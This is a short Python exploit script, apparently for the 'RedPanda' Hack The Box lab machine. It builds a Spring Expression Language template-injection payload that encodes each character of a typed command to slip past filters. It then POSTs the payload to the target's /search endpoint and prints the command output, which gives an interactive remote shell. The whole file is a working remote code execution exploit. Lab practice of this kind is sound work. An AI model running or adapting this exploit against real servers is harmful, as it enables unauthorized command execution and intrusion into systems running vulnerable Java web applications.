"""
RedPanda.py
- Sends command to the RedPanda machine as user and reads it's response
"""

# Libraries
import requests
import sys

try: 
    from BeautifulSoup import BeautifulSoup
except ImportError:
    from bs4 import BeautifulSoup

# Generate Java Payload
def generate_payload(args):
    command=args
    decimals=[]
    
    for i in command:
        decimals.append(str(ord(i)))
    
    payload='''*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
    
    
    for i in decimals[1:]:
        line='.concat(T(java.lang.Character).toString({}))'.format(i)
        payload+=line
    
    payload+=').getInputStream())}'

    return payload

# Main Loop
i = 0
while True:
    try:
        cmd = list(input(f"IN [{i}]: "))
        payload = generate_payload(cmd) # Get Payload

        # Send POST to 10.10.11.170:8080/search
        r = requests.post("http://10.10.11.170:8080/search", data={"name": payload})
        
        # Parse Response
        parsed = BeautifulSoup(r.content.decode(), "lxml")
        print(parsed.body.find("h2", attrs={"class": "searched"}).text)
    except Exception as e:
        print("Error!")
        print(e)
        sys.exit(1)

    i += 1
